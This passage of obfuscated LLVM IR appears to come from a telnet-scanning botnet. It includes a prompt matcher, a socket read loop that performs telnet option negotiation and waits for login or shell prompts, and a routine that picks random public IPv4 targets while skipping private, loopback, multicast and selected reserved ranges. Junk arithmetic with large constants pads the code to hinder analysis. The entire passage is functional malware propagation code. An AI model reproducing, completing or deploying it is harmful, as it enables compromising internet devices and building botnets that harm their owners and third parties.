  store i32 %48, i32* %56, align 4
  %57 = load i32*, i32** @pids, align 8
  %58 = bitcast i32* %57 to i8*
  call void @free(i8* %58) #2
  %59 = load i32*, i32** %3, align 8
  store i32* %59, i32** @pids, align 8
  %60 = load i32, i32* %2, align 4
  store i32 %60, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %47, %8
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %119

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %85, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %83

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, 2755474525636676045
  %30 = sub i64 %29, %28
  %31 = add i64 %30, 2755474525636676045
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %81, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, 8876092533921394945
  %45 = sub i64 %44, %43
  %46 = add i64 %45, 8876092533921394945
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %81, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = add i64 0, -3245396956713782899
  %60 = sub i64 %59, %58
  %61 = sub i64 %60, -3245396956713782899
  %62 = sub i64 0, %58
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 13
  br i1 %66, label %81, label %67

; <label>:67:                                     ; preds = %52
  %68 = load i8*, i8** %3, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 0, %73
  %75 = add i64 0, %74
  %76 = sub i64 0, %73
  %77 = getelementptr inbounds i8, i8* %71, i64 %75
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = icmp eq i32 %79, 10
  br label %81

; <label>:81:                                     ; preds = %67, %52, %37, %22
  %82 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %80, %67 ]
  br label %83

; <label>:83:                                     ; preds = %81, %18
  %84 = phi i1 [ false, %18 ], [ %82, %81 ]
  br i1 %84, label %85, label %91

; <label>:85:                                     ; preds = %83
  %86 = load i32, i32* %7, align 4
  %87 = sub i32 %86, 988100271
  %88 = add i32 %87, 1
  %89 = add i32 %88, 988100271
  %90 = add nsw i32 %86, 1
  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = sub i64 0, 3679270398272250958
  %99 = sub i64 %98, %97
  %100 = add i64 %99, 3679270398272250958
  %101 = sub i64 0, %97
  %102 = getelementptr inbounds i8, i8* %95, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %120

; <label>:113:                                    ; preds = %91
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 0, 1
  %117 = sub i32 %115, %116
  %118 = add nsw i32 %115, 1
  store i32 %117, i32* %6, align 4
  br label %11

; <label>:119:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %120

; <label>:120:                                    ; preds = %119, %112
  %121 = load i32, i32* %2, align 4
  ret i32 %121
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %152, %8
  %34 = load i32, i32* %18, align 4
  %35 = add i32 %34, 1715559148
  %36 = add i32 %35, 2
  %37 = sub i32 %36, 1715559148
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %153

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !5
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = and i64 %73, %67
  %75 = xor i64 %73, %67
  %76 = or i64 %74, %75
  %77 = or i64 %73, %67
  store i64 %76, i64* %72, align 8
  %78 = load i32, i32* %10, align 4
  %79 = sub i32 %78, 7305664
  %80 = add i32 %79, 1
  %81 = add i32 %80, 7305664
  %82 = add nsw i32 %78, 1
  %83 = call i32 @select(i32 %81, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %84 = icmp slt i32 %83, 1
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %63
  br label %153

; <label>:86:                                     ; preds = %63
  %87 = load i8*, i8** %15, align 8
  %88 = load i32, i32* %18, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  store i8* %90, i8** %23, align 8
  %91 = load i32, i32* %10, align 4
  %92 = load i8*, i8** %23, align 8
  %93 = call i64 @recv(i32 %91, i8* %92, i64 1, i32 0)
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %19, align 4
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %100, label %97

; <label>:97:                                     ; preds = %86
  %98 = load i32, i32* %19, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %97, %86
  store i32 0, i32* %9, align 4
  br label %158

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* %19, align 4
  %103 = load i32, i32* %18, align 4
  %104 = sub i32 0, %103
  %105 = sub i32 0, %102
  %106 = add i32 %104, %105
  %107 = sub i32 0, %106
  %108 = add nsw i32 %103, %102
  store i32 %107, i32* %18, align 4
  %109 = load i8*, i8** %23, align 8
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 255
  br i1 %112, label %113, label %138

; <label>:113:                                    ; preds = %101
  %114 = load i32, i32* %10, align 4
  %115 = load i8*, i8** %23, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 1
  %117 = call i64 @recv(i32 %114, i8* %116, i64 2, i32 0)
  %118 = trunc i64 %117 to i32
  store i32 %118, i32* %19, align 4
  %119 = load i32, i32* %19, align 4
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %124, label %121

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* %19, align 4
  %123 = icmp eq i32 %122, 0
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121, %113
  store i32 0, i32* %9, align 4
  br label %158

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %19, align 4
  %127 = load i32, i32* %18, align 4
  %128 = sub i32 %127, 1320126036
  %129 = add i32 %128, %126
  %130 = add i32 %129, 1320126036
  %131 = add nsw i32 %127, %126
  store i32 %130, i32* %18, align 4
  %132 = load i32, i32* %10, align 4
  %133 = load i8*, i8** %23, align 8
  %134 = call i32 @negotiate(i32 %132, i8* %133, i32 3)
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %137, label %136

; <label>:136:                                    ; preds = %125
  store i32 0, i32* %9, align 4
  br label %158

; <label>:137:                                    ; preds = %125
  br label %152

; <label>:138:                                    ; preds = %101
  %139 = load i8*, i8** %15, align 8
  %140 = load i8*, i8** %11, align 8
  %141 = call i8* @strstr(i8* %139, i8* %140) #10
  %142 = icmp ne i8* %141, null
  br i1 %142, label %150, label %143

; <label>:143:                                    ; preds = %138
  %144 = load i32, i32* %12, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %15, align 8
  %148 = call i32 @matchPrompt(i8* %147)
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %150, label %151

; <label>:150:                                    ; preds = %146, %138
  store i32 1, i32* %20, align 4
  br label %153

; <label>:151:                                    ; preds = %146, %143
  br label %152

; <label>:152:                                    ; preds = %151, %137
  br label %33

; <label>:153:                                    ; preds = %150, %85, %51
  %154 = load i32, i32* %20, align 4
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  store i32 1, i32* %9, align 4
  br label %158

; <label>:157:                                    ; preds = %153
  store i32 0, i32* %9, align 4
  br label %158

; <label>:158:                                    ; preds = %157, %156, %136, %124, %100
  %159 = load i32, i32* %9, align 4
  ret i32 %159
}

; Function Attrs: noinline nounwind uwtable
define i32 @getDatIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4, i32 1, i1 false)
  %4 = call i32 @rand() #2
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #2
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #2
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  br label %20

; <label>:20:                                     ; preds = %249, %0
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %247, label %25

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %247, label %30

; <label>:30:                                     ; preds = %25
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 100
  br i1 %34, label %35, label %45

; <label>:35:                                     ; preds = %30
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp sge i32 %38, 64
  br i1 %39, label %40, label %45

; <label>:40:                                     ; preds = %35
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp sle i32 %43, 127
  br i1 %44, label %247, label %45

; <label>:45:                                     ; preds = %40, %35, %30
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 127
  br i1 %49, label %247, label %50

; <label>:50:                                     ; preds = %45
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 169
  br i1 %54, label %55, label %60

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 254
  br i1 %59, label %247, label %60

; <label>:60:                                     ; preds = %55, %50
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %75

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sle i32 %68, 16
  br i1 %69, label %70, label %75

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp sle i32 %73, 31
  br i1 %74, label %247, label %75

; <label>:75:                                     ; preds = %70, %65, %60
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 192
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %75
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %80
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 2
  br i1 %89, label %247, label %90

; <label>:90:                                     ; preds = %85, %80, %75
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 192
  br i1 %94, label %95, label %105

; <label>:95:                                     ; preds = %90
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 88
  br i1 %99, label %100, label %105

; <label>:100:                                    ; preds = %95
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %247, label %105

; <label>:105:                                    ; preds = %100, %95, %90
  %106 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %115

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %247, label %115

; <label>:115:                                    ; preds = %110, %105
  %116 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %130

; <label>:120:                                    ; preds = %115
  %121 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %247, label %125

; <label>:125:                                    ; preds = %120
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 19
  br i1 %129, label %247, label %130

; <label>:130:                                    ; preds = %125, %115
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 198
  br i1 %134, label %135, label %145

; <label>:135:                                    ; preds = %130
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %135
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 100
  br i1 %144, label %247, label %145

; <label>:145:                                    ; preds = %140, %135, %130
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 203
  br i1 %149, label %150, label %160

; <label>:150:                                    ; preds = %145
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %150
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 113
  br i1 %159, label %247, label %160

; <label>:160:                                    ; preds = %155, %150, %145
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 62
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %160
  %166 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp sle i32 %168, 30
  br i1 %169, label %247, label %170

; <label>:170:                                    ; preds = %165, %160
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 207
  br i1 %174, label %175, label %185

; <label>:175:                                    ; preds = %170
  %176 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp sge i32 %178, 31
  br i1 %179, label %180, label %185

; <label>:180:                                    ; preds = %175
  %181 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp sle i32 %183, 120
  br i1 %184, label %247, label %185

; <label>:185:                                    ; preds = %180, %175, %170
  %186 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 65
  br i1 %189, label %190, label %200

; <label>:190:                                    ; preds = %185
  %191 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp sge i32 %193, 224
  br i1 %194, label %195, label %200

; <label>:195:                                    ; preds = %190
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp sle i32 %198, 226
  br i1 %199, label %247, label %200

; <label>:200:                                    ; preds = %195, %190, %185
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 195
  br i1 %204, label %205, label %210

; <label>:205:                                    ; preds = %200
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 10
  br i1 %209, label %247, label %210

; <label>:210:                                    ; preds = %205, %200
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 216
  br i1 %214, label %215, label %225

; <label>:215:                                    ; preds = %210
  %216 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 25
  br i1 %219, label %247, label %220

; <label>:220:                                    ; preds = %215
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 94
  br i1 %224, label %247, label %225

; <label>:225:                                    ; preds = %220, %210
  %226 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 212
  br i1 %229, label %230, label %235

; <label>:230:                                    ; preds = %225
  %231 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 56
  br i1 %234, label %247, label %235

; <label>:235:                                    ; preds = %230, %225
  %236 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp sge i32 %238, 224
  br i1 %239, label %240, label %245

; <label>:240:                                    ; preds = %235
  %241 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp sle i32 %243, 239
  br label %245

; <label>:245:                                    ; preds = %240, %235
  %246 = phi i1 [ false, %235 ], [ %244, %240 ]
  br label %247

; <label>:247:                                    ; preds = %245, %230, %220, %215, %205, %195, %180, %165, %155, %140, %125, %120, %110, %100, %85, %70, %55, %45, %40, %25, %20
  %248 = phi i1 [ true, %230 ], [ true, %220 ], [ true, %215 ], [ true, %205 ], [ true, %195 ], [ true, %180 ], [ true, %165 ], [ true, %155 ], [ true, %140 ], [ true, %125 ], [ true, %120 ], [ true, %110 ], [ true, %100 ], [ true, %85 ], [ true, %70 ], [ true, %55 ], [ true, %45 ], [ true, %40 ], [ true, %25 ], [ true, %20 ], [ %246, %245 ]
  br i1 %248, label %249, label %266

; <label>:249:                                    ; preds = %247
  %250 = call i32 @rand() #2
  %251 = srem i32 %250, 255
  %252 = trunc i32 %251 to i8
  %253 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %252, i8* %253, align 1
  %254 = call i32 @rand() #2
  %255 = srem i32 %254, 255
  %256 = trunc i32 %255 to i8
  %257 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %256, i8* %257, align 1
  %258 = call i32 @rand() #2
  %259 = srem i32 %258, 255
  %260 = trunc i32 %259 to i8
  %261 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %260, i8* %261, align 1
  %262 = call i32 @rand() #2
  %263 = srem i32 %262, 255
  %264 = trunc i32 %263 to i8
  %265 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %264, i8* %265, align 1
  br label %20

; <label>:266:                                    ; preds = %247
  %267 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 16, i32 16, i1 false)
  %268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %269 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
